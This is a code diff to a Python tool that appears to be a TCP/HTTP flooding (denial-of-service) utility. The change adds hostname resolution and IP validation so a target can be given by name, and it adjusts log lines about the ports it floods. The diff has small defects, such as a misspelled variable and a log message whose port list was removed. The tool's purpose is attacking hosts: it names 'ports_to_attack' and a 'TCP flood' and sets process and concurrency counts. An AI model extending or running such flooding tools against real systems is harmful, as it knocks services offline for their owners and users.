@@ -160,6 +160,16 @@ def worker_process_tcp(
 
 
 
+def is_valid_ip(ip: str) -> bool:
+    try:
+        socket.inet_pton(socket.AF_INET, ip)
+        return True
+    except socket.error:
+        try:
+            socket.inet_pton(socket.AF_INET6, ip)
+            return True
+        except socket.error:
+            return False
 
 def main() -> None:
     parser = create_argument_parser()
@@ -169,16 +179,27 @@ def main() -> None:
     if not validate_arguments(args):
         sys.exit(1)
 
+
+    target_ip = args.target_ip
+    if target_ip and not is_valid_ip(target_ip):
+        try:
+            log.info(f"Resolving hostname {target_ip}...")
+            reslove_ip = socket.gethostbyname(target_ip)
+            log.info(f"Resolved {target_ip} to {reslove_ip}")
+            target_ip = reslove_ip
+        except socket.gaierror:
+            log.error(f"Could not resolve hostname: {target_ip}")
+            sys.exit(1)
     
 
     ports_to_attack = []
 
    
 
-    if args.target_ip:
+    if target_ip:
         if args.port:
             ports_to_attack = parse_ports(args.port)
-            log.info(f"Using specified ports for TCP flood: {ports_to_attack}")
+            log.info(f"Using specified ports for TCP flood: ")
         
         elif args.scan_common:
             ports_to_attack = PortScanner.scan_common_ports(
@@ -211,7 +232,6 @@ def main() -> None:
     - Target URL: {args.target_url}
     
     - Target IP: {args.target_ip}
-    - Target Port: {ports_to_attack}
     
     - Processes: {args.thread_count}
     - Concurrency per process: {args.concurrency}
